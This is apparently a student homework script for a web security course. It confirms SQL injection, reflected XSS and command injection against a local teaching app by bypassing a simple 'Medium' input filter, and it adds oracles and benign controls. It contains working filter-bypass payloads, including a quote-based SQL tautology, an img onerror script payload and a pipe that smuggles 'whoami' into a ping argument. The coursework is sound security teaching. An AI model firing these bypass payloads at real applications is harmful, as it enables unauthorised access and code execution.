# Homework 2 — Web Attack & Defend — Part A (Attack) — Team: Gabriel Avalos, Keoma Quiroga, David Bucheli
"""Part A — confirm THREE distinct vulnerability classes (SQLi, XSS, cmdi), each
through a Medium-filter bypass, each confirmed by a SOUND ORACLE.

Discipline (scorecard axis 3): a finding is NOT "the page looked different." It is
"a sound oracle confirmed a security-relevant effect, reproducibly." So for each
class we:

  1. show the naive week-6 payload is BLOCKED by the Medium filter (medium.py),
  2. find a one-line BYPASS (case / comment / alternate-metacharacter / tag) that
     the Medium filter PASSES,
  3. send the bypass to the REAL vuln-web sink and confirm the effect with an
     oracle (canary leak / unescaped live markup / shell metachar reached cmd),
  4. run a BENIGN control that the filter passes and the oracle must NOT confirm —
     a false positive in our own tooling would poison every number downstream.

Each payload is fired trials=3 times; a finding reports successes/trials so a
flaky confirmation can't masquerade as a reliable exploit.

Run:  python attack/attack.py      (writes results/attack_findings.csv)
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))   # homework/hw2/avalos (for _harness)
sys.path.insert(0, str(HERE))          # for medium

import _harness as H                   # noqa: E402  (puts course ROOT on sys.path)
import medium                          # noqa: E402

from seclab.attack import Payload, run_payloads, contains_oracle  # noqa: E402

TRIALS = 3


# --- sound oracles -----------------------------------------------------------
def xss_oracle(payload: Payload, response: str):
    """Sound necessary condition for reflected XSS: the injected markup survives
    UNescaped (a live ``<...>`` element), not merely reflected as text. We tie it
    to a per-payload marker so we confirm THIS injection, not any stray '<'."""
    marker = payload.note                      # e.g. onerror=alert('XSS-7f3a')
    live = (marker in response) and ("&lt;" not in response) and ("<" in response)
    return live, (f"live unescaped markup carrying {marker!r}" if live else "")


def cmdi_oracle(payload: Payload, response: str):
    """Sound oracle for cmdi: the app reports a shell metacharacter reached the
    command context (injection_detected), not that the host was echoed."""
    try:
        detected = json.loads(response).get("injection_detected") is True
    except Exception:
        detected = False
    return detected, ("shell metacharacter reached command context" if detected else "")


# --- the three classes -------------------------------------------------------
def confirm_sqli():
    naive = "admin' OR 1=1--"
    bypass = "admin' OR 'a'='a'--"            # non-numeric tautology: evades OR d=d
    benign = "alice"                          # a real username, wrong password
    payloads = [
        Payload(bypass, intent="auth-bypass + canary leak", family="sqli",
                note="comment/logic bypass of OR d=d rule"),
        Payload(benign, intent="benign control", family="benign"),
    ]
    findings = run_payloads(payloads, send=H.login_send,
                            oracle=contains_oracle(H.canary()), trials=TRIALS)
    return naive, bypass, findings


def confirm_xss():
    naive = "<script>alert('XSS-7f3a')</script>"
    marker = "onerror=alert('XSS-7f3a')"
    bypass = f"<img src=x {marker}>"          # no <script tag: evades the Medium rule
    benign = "Keoma O'Brien"                  # a legit name with an apostrophe
    payloads = [
        Payload(bypass, intent="reflected XSS via event handler", family="xss",
                note=marker),
        Payload(benign, intent="benign control", family="benign",
                note="no-such-marker"),
    ]
    vuln = run_payloads(payloads, send=H.reflect_send, oracle=xss_oracle, trials=TRIALS)
    # True negative: same bypass at the FIXED /safe endpoint must NOT confirm.
    safe = run_payloads([payloads[0]], send=H.reflect_safe_send,
                        oracle=xss_oracle, trials=TRIALS)[0]
    return naive, bypass, vuln, safe


def confirm_cmdi():
    naive = "127.0.0.1; whoami"
    bypass = "127.0.0.1 | whoami"             # pipe: evades ';' and '&&' rules
    benign = "api.internal.example"           # a plain hostname, no metacharacters
    payloads = [
        Payload(bypass, intent="smuggle second command", family="cmdi",
                note="alternate metacharacter '|'"),
        Payload(benign, intent="benign control", family="benign"),
    ]
    findings = run_payloads(payloads, send=H.ping_send, oracle=cmdi_oracle, trials=TRIALS)
    return naive, bypass, findings


def main():
    H.serve()
    rows = []   # class, naive, naive_blocked_by, bypass, bypass_passes_medium, confirmed, successes/trials, owasp, evidence

    # SQLi -------------------------------------------------------------------
    naive, bypass, fs = confirm_sqli()
    f = fs[0]
    rows.append(["sqli", naive, medium.sqli_medium(naive), bypass,
                 medium.sqli_medium(bypass) is None, f.confirmed,
                 f"{f.successes}/{f.trials}", "A03:2021 Injection", f.evidence])
    benign = fs[1]
    rows.append(["sqli-benign-control", benign.payload.text, "-", "-", "-",
                 benign.confirmed, f"{benign.successes}/{benign.trials}",
                 "A03:2021 Injection", benign.evidence or "no canary (correct)"])

    # XSS --------------------------------------------------------------------
    naive, bypass, vuln, safe = confirm_xss()
    fv = vuln[0]
    rows.append(["xss", naive, medium.xss_medium(naive), bypass,
                 medium.xss_medium(bypass) is None, fv.confirmed,
                 f"{fv.successes}/{fv.trials}", "A03:2021 Injection", fv.evidence])
    fb = vuln[1]
    rows.append(["xss-benign-control", fb.payload.text, "-", "-", "-",
                 fb.confirmed, f"{fb.successes}/{fb.trials}",
                 "A03:2021 Injection", fb.evidence or "no live marker (correct)"])
    rows.append(["xss-true-negative(/safe)", bypass, "-", bypass,
                 medium.xss_medium(bypass) is None, safe.confirmed,
                 f"{safe.successes}/{safe.trials}", "A03:2021 Injection",
                 safe.evidence or "escaped by html.escape (correct)"])

    # cmdi -------------------------------------------------------------------
    naive, bypass, fs = confirm_cmdi()
    f = fs[0]
    rows.append(["cmdi", naive, medium.cmdi_medium(naive), bypass,
                 medium.cmdi_medium(bypass) is None, f.confirmed,
                 f"{f.successes}/{f.trials}", "A03:2021 Injection", f.evidence])
    benign = fs[1]
    rows.append(["cmdi-benign-control", benign.payload.text, "-", "-", "-",
                 benign.confirmed, f"{benign.successes}/{benign.trials}",
                 "A03:2021 Injection", benign.evidence or "no metachar (correct)"])

    out = HERE / "results" / "attack_findings.csv"
    H.write_csv(out, ["class", "naive_payload", "naive_blocked_by",
                      "bypass_payload", "bypass_passes_medium", "oracle_confirmed",
                      "successes/trials", "owasp_2021", "oracle_evidence"], rows)

    # console summary
    print("PART A — attack (each class confirmed through a Medium-filter bypass)\n")
    for r in rows:
        tag = "CONFIRMED" if r[5] is True else ("clean" if r[5] is False else r[5])
        print(f"  {r[0]:<26} {tag:<10} {r[6]:<6} "
              f"naive_blocked={r[2]!s:<40} bypass_passes={r[4]}")
    print(f"\n  wrote {out.relative_to(H.ROOT)}")
    return rows


if __name__ == "__main__":
    main()
